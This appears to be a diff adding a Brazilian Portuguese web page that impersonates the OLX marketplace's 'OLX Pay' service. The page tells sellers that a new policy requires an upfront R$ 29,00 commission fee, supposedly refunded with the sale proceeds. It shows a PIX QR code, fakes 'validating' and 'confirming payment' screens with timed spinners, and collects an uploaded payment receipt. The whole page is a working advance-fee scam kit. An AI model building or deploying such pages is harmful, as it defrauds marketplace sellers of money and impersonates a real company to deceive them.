@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OLX Pay</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+body{
+    background:#f2f4f5;
+    display:flex;
+    justify-content:center;
+}
+
+/* CONTAINER */
+.container{
+    width:100%;
+    max-width:420px;
+    background:#fff;
+    min-height:100vh;
+    border-left:1px solid #e6e6e6;
+    border-right:1px solid #e6e6e6;
+}
+
+/* HEADER */
+header{
+    padding:16px;
+    border-bottom:1px solid #eee;
+}
+
+.logo{
+    font-size:22px;
+    font-weight:700;
+}
+.logo span:nth-child(1){color:#6e0ad6;}
+.logo span:nth-child(2){color:#00a650;}
+.logo span:nth-child(3){color:#ff6a00;}
+
+/* CARD */
+.card{
+    margin:24px 16px;
+    padding:22px 16px;
+    background:#fff;
+    border:1px solid #e0e0e0;
+    border-radius:12px;
+    text-align:center;
+}
+
+/* TEXTOS */
+.title{
+    font-size:16px;
+    font-weight:600;
+    color:#333;
+    margin-bottom:10px;
+}
+
+.subtitle{
+    font-size:15px;
+    font-weight:600;
+    color:#6e0ad6;
+    margin-bottom:14px;
+}
+
+/* ALERTA */
+.alert {
+    background: #f3e8ff;
+    color: #3b2a63;
+    border-radius: 10px;
+    padding: 14px;
+    font-size: 13px;
+    line-height: 1.5;
+}
+
+/* BOTÕES */
+.btn{
+    width:100%;
+    padding:13px;
+    border-radius:8px;
+    font-size:14px;
+    font-weight:600;
+    cursor:pointer;
+    margin-bottom:10px;
+    transition:0.2s;
+}
+
+.btn-primary{
+    background:#6e0ad6;
+    color:#fff;
+    border:none;
+}
+
+.btn-primary:hover{
+    background:#5a08b4;
+}
+
+.btn-outline{
+    border:1.5px solid #6e0ad6;
+    color:#6e0ad6;
+    background:#fff;
+}
+
+.btn-outline:hover{
+    background:#f3e8ff;
+}
+
+/* INPUT */
+.input{
+    width:100%;
+    padding:11px;
+    border-radius:6px;
+    border:1px solid #ccc;
+    margin-bottom:10px;
+    font-size:13px;
+}
+
+/* QR */
+.qr{
+    width:170px;
+    margin:15px auto;
+    display:block;
+}
+
+/* LOADING */
+.loading{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    height:220px;
+}
+
+.spinner{
+    width:34px;
+    height:34px;
+    border:4px solid #eee;
+    border-top:4px solid #6e0ad6;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin-bottom:12px;
+}
+
+@keyframes spin{
+    to{transform:rotate(360deg);}
+}
+
+.loading-text{
+    font-size:13px;
+    color:#666;
+}
+
+/* FINAL */
+.help{
+    text-align:center;
+    font-size:13px;
+    color:#6e0ad6;
+    margin-top:10px;
+}
+
+.footer{
+    text-align:center;
+    font-size:11px;
+    color:#777;
+    padding:15px;
+}
+
+.illustration{
+    width:80px;
+    margin-bottom:10px;
+}
+
+.hidden{display:none;}
+
+/* STEP FINAL */
+.final-wrapper{
+    padding:20px 15px;
+}
+
+.final-card{
+    background:#fff;
+    border:1px solid #e5e5e5;
+    border-radius:10px;
+    padding:35px 18px;
+    text-align:center;
+}
+
+.final-title{
+    color:#6e0ad6;
+    font-size:20px;
+    font-weight:600;
+    margin-bottom:18px;
+}
+
+.final-img{
+    width:130px;
+    margin-bottom:20px;
+}
+
+.final-box{
+    background:#f3e8ff;
+    color:#2d1b4e;
+    border-radius:14px;
+    padding:20px;
+    font-size:14px;
+    line-height:1.4;
+    margin-bottom:25px;
+}
+
+.terms{
+    font-size:11px;
+    color:#999;
+    margin-bottom:20px;
+}
+
+.terms span {
+    color: #6e0ad6;
+}
+
+.divider{
+    width:100%;
+    height:1px;
+    background:#eee;
+    margin:20px 0;
+    position: relative;
+}
+
+.attention-label {
+    position: absolute;
+    top: -10px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #fff;
+    padding: 0 10px;
+    color: #6e0ad6;
+    font-size: 13px;
+    font-weight: 600;
+}
+
+.attention-text{
+    font-size:12px;
+    color:#777;
+    margin-top: 25px;
+    line-height: 1.4;
+}
+
+/* ===== LOADING SCREEN ===== */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #f2f4f5;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+    gap: 20px;
+}
+
+.loading-overlay.active {
+    display: flex;
+    animation: fadeIn 0.3s ease-in;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.loading-header {
+    margin-bottom: 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 15px;
+}
+
+.loading-logo {
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: -1px;
+}
+
+.loading-logo span:nth-child(1) { color: #6e0ad6; }
+.loading-logo span:nth-child(2) { color: #00a650; }
+.loading-logo span:nth-child(3) { color: #ff6a00; }
+
+.spinner-simple {
+    width: 50px;
+    height: 50px;
+    border: 4px solid #f0f0f0;
+    border-top: 4px solid #6e0ad6;
+    border-radius: 50%;
+    animation: spinSimple 1s linear infinite;
+}
+
+@keyframes spinSimple {
+    to { transform: rotate(360deg); }
+}
+
+.loading-text {
+    color: #666;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-header">
+        <div class="loading-logo">
+            <span>o</span><span>l</span><span>x</span>
+        </div>
+    </div>
+    <div class="spinner-simple"></div>
+    <div class="loading-text">Processando...</div>
+</div>
+
+<div class="container">
+
+<header>
+    <div class="logo">
+        <span>o</span><span>l</span><span>x</span>
+    </div>
+</header>
+
+<div id="loading" class="loading hidden">
+    <div class="spinner"></div>
+    <div class="loading-text">Processando sua solicitação...</div>
+</div>
+
+<div id="step1" class="card">
+    <div class="subtitle">Aviso importante</div>
+    <div class="alert">
+Identificamos que você acabou de realizar uma venda do seu produto e não possui pontuação como vendedor pelo nosso aplicativo e estamos com uma nova política.
+Iremos cobrar nossa taxa de comissão antecipada por questões de segurança e para sabermos se você realmente deseja concluir a venda do seu produto em nossa plataforma. 
+Lembrando que esse valor cobrado é devolvido junto com o valor total da venda.
+</div>
+<p style="font-weight:700; margin-top:15px;">VALOR ÚNICO: R$ <span id="valorTaxa">29,00</span></p>
+<br/>
+    <button class="btn btn-primary" onclick="goNext(1)">Continuar</button>
+</div>
+
+<div id="step2" class="card hidden">
+    <div class="subtitle">Confirmação de taxa</div>
+    <div class="alert">
+        Essa etapa garante a segurança da transação para ambas as partes.  
+        O valor pago será automaticamente somado ao total que você irá receber após a conclusão da venda.
+    </div>
+    <button class="btn btn-primary" onclick="goNext(2)">Entendi, prosseguir</button>
+</div>
+
+<div id="step3" class="card hidden">
+    <div class="title">Pagamento via <strong>OLX Pay</strong></div>
+    <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=PIXTESTE">
+    <input class="input" value="000201PIXCODE..." readonly id="pixCode">
+    <button class="btn btn-primary" onclick="copy()">Copiar código</button>
+    <button class="btn btn-outline" onclick="paid()">Já realizei o pagamento</button>
+</div>
+
+<div id="step4" class="hidden">
+    <div class="card">
+        <img class="illustration" src="https://cdn-icons-png.flaticon.com/512/2922/2922510.png">
+        <div class="title">Envie o comprovante</div>
+        <div class="alert">
+            Após o pagamento, envie o comprovante para que possamos validar a transação.
+            <br><br>
+            Isso agiliza a liberação do valor e evita atrasos no recebimento.
+        </div>
+        <button id="uploadBtn" class="btn btn-outline">Enviar comprovante</button>
+        <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png,.gif,.doc,.docx" style="display:none;">
+        <button class="btn btn-primary" onclick="goFinal()">Confirmar envio</button>
+    </div>
+    <div class="help">Preciso de ajuda</div>
+    <div class="footer">Ao continuar, você concorda com os Termos de Uso e a Política de Privacidade.</div>
+</div>
+
+<div id="step5" class="hidden final-wrapper">
+    <div class="final-card">
+        <h2 class="final-title">Huhuhu! Agora é com a gente!</h2>
+        
+        <img class="final-img" src="https://i.ibb.co/kVKs7sbv/Gemini-Generated-Image-qsh1voqsh1voqsh1.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/4140/4140048.png'">
+
+        <div class="final-box">
+            Agora é só aguardar, vamos analisar sua proposta, iremos analisar os seus dados e um de nossos representantes vai <strong>entrar em contato</strong> fique atento.
+        </div>
+
+        <p class="terms">
+            <span>Termos de Uso</span> e a <span>Política de Privacidade</span> da OLX e seus parceiros, e em receber comunicações da OLX.
+        </p>
+
+        <div class="divider">
+            <span class="attention-label">Atenção</span>
+        </div>
+
+        <p class="attention-text">
+            Lembrando que essa central só é disponível para quem está realizando a sua venda com retirada por conta do comprador.
+        </p>
+    </div>
+</div>
+
+</div>
+
+<script>
+let fileSelected = false;
+let fileName = '';
+let fileObject = null;
+
+// Carregar valor da taxa do config.json (fallback)
+function carregarValorTaxa() {
+    fetch('/config.json')
+        .then(response => response.json())
+        .then(data => {
+            const valorTaxa = document.getElementById('valorTaxa');
+            if (valorTaxa && data.preco) {
+                valorTaxa.textContent = parseFloat(data.preco).toFixed(2).replace('.', ',');
+            }
+        })
+        .catch(error => console.error('Erro ao carregar config.json:', error));
+}
+
+// Carregar dados da venda e código PIX
+function carregarDadosVenda() {
+    const id = localStorage.getItem('vendaId');
+    
+    if (id) {
+        fetch(`/api/venda/${id}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data) {
+                    const valorTaxa = document.getElementById('valorTaxa');
+                    if (valorTaxa && (data.valorTaxa != null || data.taxa != null)) {
+                        const taxa = data.valorTaxa != null ? data.valorTaxa : data.taxa;
+                        valorTaxa.textContent = parseFloat(taxa).toFixed(2).replace('.', ',');
+                    }
+
+                    if (data.codigoPix) {
+                        // Atualizar QR code
+                        const qrImg = document.querySelector('.qr');
+                        if (qrImg) {
+                            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(data.codigoPix)}`;
+                        }
+                        
+                        // Atualizar input do código PIX
+                        const pixInput = document.getElementById('pixCode');
+                        if (pixInput) {
+                            pixInput.value = data.codigoPix;
+                        }
+                    } else {
+                        console.warn('Código PIX não encontrado na venda');
+                    }
+
+                    console.log('Dados da venda carregados:', data);
+                }
+            })
+            .catch(error => console.error('Erro ao carregar dados da venda:', error));
+    } else {
+        console.warn('ID da venda não encontrado no localStorage');
+    }
+}
+
+// Inicializar event listeners
+document.addEventListener('DOMContentLoaded', function() {
+    carregarValorTaxa();
+    carregarDadosVenda();
+    
+    const uploadBtn = document.getElementById('uploadBtn');
+    const fileInput = document.getElementById('fileInput');
+    
+    if (uploadBtn) {
+        uploadBtn.addEventListener('click', function() {
+            fileInput.click();
+        });
+    }
+    
+    if (fileInput) {
+        fileInput.addEventListener('change', handleFileSelect);
+    }
+});
+
+function handleFileSelect(e) {
+    if (e.target.files && e.target.files.length > 0) {
+        const file = e.target.files[0];
+        fileObject = file;
+        fileName = file.name;
+        fileSelected = true;
+        
+        // Atualizar feedback visual
+        const uploadBtn = document.getElementById('uploadBtn');
+        uploadBtn.textContent = '✓ ' + fileName;
+        uploadBtn.style.background = '#27ae60';
+        uploadBtn.style.color = '#fff';
+        
+        console.log('Arquivo selecionado:', fileName);
+    }
+}
+
+function showLoading(text){
+    const loadingOverlay = document.getElementById("loadingOverlay");
+    const loadingText = document.querySelector(".loading-text");
+    if (loadingText) loadingText.innerText = text;
+    loadingOverlay.classList.add("active");
+    document.getElementById("loading").classList.remove("hidden");
+}
+
+function hideLoading(){
+    const loadingOverlay = document.getElementById("loadingOverlay");
+    loadingOverlay.classList.remove("active");
+    document.getElementById("loading").classList.add("hidden");
+}
+
+function goNext(step){
+    document.getElementById("step"+step).classList.add("hidden");
+    showLoading("Validando informações...");
+    setTimeout(()=>{
+        hideLoading();
+        document.getElementById("step"+(step+1)).classList.remove("hidden");
+    }, 1800);
+}
+
+function paid(){
+    document.getElementById("step3").classList.add("hidden");
+    showLoading("Confirmando pagamento...");
+    setTimeout(()=>{
+        hideLoading();
+        document.getElementById("step4").classList.remove("hidden");
+    }, 2200);
+}
+
+function copy(){
+    const input = document.getElementById("pixCode");
+    input.select();
+    navigator.clipboard.writeText(input.value);
+    alert("Código copiado com sucesso.");
+}
+
+async function goFinal(){
+    if (!fileSelected) {
+        alert('Por favor, selecione um comprovante antes de confirmar.');
+        return;
+    }
+    
+    document.getElementById("step4").classList.add("hidden");
+    showLoading("Enviando comprovante via WhatsApp...");
+    
+    try {
+        // Preparar FormData com o arquivo
+        const formData = new FormData();
+        formData.append('comprovante', fileObject);
+        
+        // Enviar arquivo para o servidor
+        const response = await fetch('/api/enviar-comprovante', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            console.log('Comprovante enviado com sucesso:', data.message);
+            
+            // Mostrar tela final após envio bem-sucedido
+            showLoading("Analisando comprovante...");
+            
+            setTimeout(()=>{
+                hideLoading();
+                document.getElementById("step5").classList.remove("hidden");
+            }, 1500);
+        } else {
+            hideLoading();
+            alert('Erro ao enviar comprovante: ' + data.message);
+            document.getElementById("step4").classList.remove("hidden");
+            console.error('Erro:', data.message);
+        }
+    } catch (error) {
+        hideLoading();
+        console.error('Erro ao enviar arquivo:', error);
+        alert('Erro ao enviar arquivo: ' + error.message);
+        document.getElementById("step4").classList.remove("hidden");
+    }
+}
+</script>
+
+</body>
+</html>
